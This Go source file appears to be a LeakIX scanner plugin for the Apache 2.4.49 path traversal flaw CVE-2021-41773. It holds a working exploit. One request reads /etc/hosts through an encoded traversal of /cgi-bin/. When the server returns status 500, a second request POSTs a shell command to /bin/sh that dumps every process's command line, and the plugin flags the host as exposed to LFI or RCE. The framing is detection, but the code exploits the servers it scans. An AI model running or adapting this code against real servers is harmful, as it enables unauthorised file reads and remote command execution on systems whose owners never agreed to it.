package tcp
/*
 * Thanks to https://twitter.com/HaboubiAnis for pointers on this plugin.
 */
import (
	"bytes"
	"context"
	"github.com/LeakIX/l9format"
	"io"
	"io/ioutil"
	"net/http"
	"strings"
)

type Apache2449TraversalPlugin struct {
	l9format.ServicePluginBase
}

func (Apache2449TraversalPlugin) GetVersion() (int, int, int) {
	return 0, 2, 2
}

func (Apache2449TraversalPlugin) GetProtocols() []string {
	return []string{"http", "https"}
}

func (Apache2449TraversalPlugin) GetName() string {
	return "Apache2449TraversalPlugin"
}

func (Apache2449TraversalPlugin) GetStage() string {
	return "open"
}

// Get info
func (plugin Apache2449TraversalPlugin) Run(ctx context.Context, event *l9format.L9Event, pluginOptions map[string]string) bool {
	event.Http.Url = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
	req, err := http.NewRequest("GET", event.Url(), nil)
	if err != nil {
		return false
	}
	req.Header["User-Agent"] = []string{"Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)"}
	resp, err := plugin.GetHttpClient(ctx, event.Ip, event.Port).Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 500 {
		return plugin.RunRce(ctx, event)
	}
	if resp.StatusCode != 200 {
		return false
	}
	body, err := ioutil.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	if err != nil {
		return false
	}
	lowerBody := strings.ToLower(string(body))
	if len(lowerBody) < 10 {
		return false
	}
	if strings.Contains(lowerBody, "html") {
		return false
	}
	if !strings.Contains(lowerBody, "localhost") && !strings.Contains(lowerBody, "127.0.0.1") {
		return false
	}
	event.Leak.Severity = "critical"
	event.Leak.Type = "lfi"
	event.AddTag("cve-2021-41773")
	event.Summary = "Found host file trough Apache traversal:\n" + lowerBody
	return true
}

func (plugin Apache2449TraversalPlugin) RunRce(ctx context.Context, event *l9format.L9Event) bool {
	event.Http.Url = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
	payload := bytes.NewBufferString("echo;for file in /proc/*/cmdline; do echo; cat $file; done")
	req, err := http.NewRequest("POST", event.Url(), payload)
	if err != nil {
		return false
	}
	req.Header["User-Agent"] = []string{"Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)"}
	resp, err := plugin.GetHttpClient(ctx, event.Ip, event.Port).Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return false
	}
	body, err := ioutil.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	if err != nil {
		return false
	}
	lowerBody := strings.ToLower(string(body))
	if len(lowerBody) < 10 {
		return false
	}
	if strings.Contains(lowerBody, "<html") {
		return false
	}
	if !strings.Contains(lowerBody, "httpd") && !strings.Contains(lowerBody, "apache") {
		return false
	}
	event.Leak.Severity = "critical"
	event.Leak.Type = "rce"
	event.AddTag("cve-2021-41773")
	event.Summary = "Found processes trough Apache RCE:\n" + lowerBody
	return true
}